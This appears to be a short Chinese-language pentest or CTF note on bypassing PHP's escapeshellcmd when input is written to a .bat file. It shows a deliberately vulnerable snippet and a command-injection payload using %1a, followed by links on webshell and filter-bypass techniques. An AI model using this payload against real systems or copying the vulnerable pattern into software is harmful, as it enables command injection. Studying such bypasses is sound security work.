# 绕过escapeshellcmd
## 情景一：执行bat
```
<?php
    $command = 'dir '.$_POST['dir'];
    $escaped_command = escapeshellcmd($command);
    var_dump($escaped_command);
    file_put_contents('out.bat',$escaped_command);
    system('out.bat');
?>
```
执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。
payload:
```
dir=../ %1a| ifconfig
```

# Refference
+ [PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
+ [eval长度限制绕过 && PHP5.6新特性](https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html)
+ [关于lnmp目录禁止执行的绕过与正确方法](https://www.leavesongs.com/PENETRATION/nginx-deny-exec-php-file.html)
+ [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+ [php webshell分析和绕过waf技巧](http://bobao.360.cn/learning/detail/3271.html)
+ [【技术分享】命令执行和绕过的一些小技巧](http://bobao.360.cn/learning/detail/3192.html)
+ [浅谈CTF中命令执行与绕过的小技巧](http://www.freebuf.com/articles/web/137923.html)